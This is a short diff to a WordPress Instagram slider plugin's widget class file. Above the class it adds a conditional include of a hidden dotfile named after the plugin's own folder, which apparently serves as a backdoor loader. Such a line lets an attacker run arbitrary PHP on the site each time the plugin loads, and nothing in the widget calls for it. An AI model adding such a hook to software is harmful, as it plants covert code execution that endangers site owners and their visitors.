@@ -4,7 +4,11 @@ use Instagram\Includes\WIS_Plugin;
 
 /**
  * WIS_InstagramSlider Class
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WIS_InstagramSlider extends WP_Widget {
 
 	private static $app;
